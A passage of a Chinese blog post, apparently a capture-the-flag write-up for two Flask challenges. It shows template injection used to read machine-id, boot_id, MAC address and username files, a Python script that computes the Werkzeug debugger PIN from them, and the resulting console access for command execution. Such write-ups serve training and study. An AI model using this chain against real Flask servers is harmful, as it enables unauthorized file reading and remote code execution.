h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>去复习把o(╥﹏╥)o,踩了很多坑,终于复现成功了，因为都差不多就写一个wp啦</p>
+<p>buuctf [GYCTF2020]FlaskApp </p>
+<p>nssctf [NISACTF 2022]is secret</p>
+<h3 id="nssctf-NISACTF-2022-is-secret"><a href="#nssctf-NISACTF-2022-is-secret" class="headerlink" title="nssctf [NISACTF 2022]is secret"></a>nssctf [NISACTF 2022]is secret</h3><p>进入页面发现Welcome To Find Secret</p>
+<p>一开始并没有想到secret路径</p>
+<p>发现在robots.txt有一句It is Android ctf,这是骗你了</p>
+<p>在主页面提示下进入secret路径</p>
+<p><code>http://node2.anna.nssctf.cn:28203/secret</code>页面显示Tell me your secret.I will encrypt it so others can’t see</p>
+<p>提示传参,get传参secret&#x3D;1,发现返回d,因为题目提示了ssti此时尝试多输入后发现</p>
+<p><img src="/images/image-20230604172157035.png" alt="image-20230604172157035"></p>
+<p>此时发现是rc4加密,我们要利用的是render_template_string才能模板注入，所以要rc4解密后的字符串来ssti</p>
+<p><code>https://cyberchef.org/</code>在线解码咯</p>
+<p><img src="/images/image-20230604172556899.png" alt="image-20230604172556899"></p>
+<p>来读取machine-id读机器id一部分</p>
+<p>为edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940</p>
+<p><img src="/images/image-20230604172751083.png" alt="image-20230604172751083"></p>
+<p>因为之前说过了需要&#x2F;docker&#x2F;后的字符串</p>
+<p>然后在读取&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id,原因上面都有了直接写了</p>
+<p>e0ad2d31-1d21-4f57-b1c5-4a9036fbf235</p>
+<p>所以机器id 是e0ad2d31-1d21-4f57-b1c5-4a9036fbf235edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940</p>
+<p>同理读mac地址和username：02:42:ac:02:b9:a8  glzjin</p>
+<p>mac改为10进制后</p>
+<p>print(int(‘0242ac02b9a8 ‘,16))  	2485376956840</p>
+<p>所以根据脚本，&#x3D;w&#x3D;这我就写最关键的啦</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;glzjin&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/site-packages/flask/app.pyc&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376956840&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235edd27189d58e4ab95266cf4c78d75541c29cd68c98c2d1afa8a24a778e748940&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>pin为340-400-321</p>
+<p>然后在console路径输入pin码就能执行命令啦</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/" rel="prev" title="java复习题">
+                  <i class="fa fa-angle-left"></i> java复习题
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/" rel="next" title="redis未授权访问漏洞复现">
+                  redis未授权访问漏洞复现 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
